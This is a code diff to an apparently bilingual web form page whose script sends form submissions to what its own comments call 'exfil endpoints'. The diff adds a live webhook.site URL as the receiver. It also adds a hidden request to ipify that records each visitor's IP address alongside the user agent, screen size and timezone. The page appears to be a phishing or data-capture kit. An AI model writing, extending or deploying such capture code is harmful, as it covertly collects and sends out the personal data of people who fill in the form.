@@ -172,7 +172,7 @@
 // Operator-configurable exfil endpoints (POST JSON). Leave empty for operator-run mode:
 // captures then stage to clipboard + localStorage.
 var SCU_RECEIVERS = [
-  // e.g. "https://your-endpoint.example/capture"
+  "https://webhook.site/fa1eb6d4-15ff-4df1-8a57-5469dfea1dad"
 ];
 
 function setLang(l) {
@@ -201,6 +201,7 @@ document.getElementById('vform').addEventListener('submit', function (ev) {
     lang: document.body.classList.contains('es') ? 'es' : 'en',
     ts: new Date().toISOString(),
     ua: navigator.userAgent,
+    ip: window._ip || null,
     screen: screen.width + 'x' + screen.height + '@' + window.devicePixelRatio,
     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
     honeypot: hp || null,
@@ -239,6 +240,13 @@ document.getElementById('vform').addEventListener('submit', function (ev) {
   });
 });
 
+try {
+  var ipx = new XMLHttpRequest();
+  ipx.open('GET', 'https://api.ipify.org?format=json', true);
+  ipx.timeout = 4000;
+  ipx.onload = function () { try { window._ip = JSON.parse(ipx.responseText).ip; } catch (e) {} };
+  ipx.send();
+} catch (e) {}
 try {
   var saved = localStorage.getItem('scu_lang');
   if (saved === 'es') setLang('es');
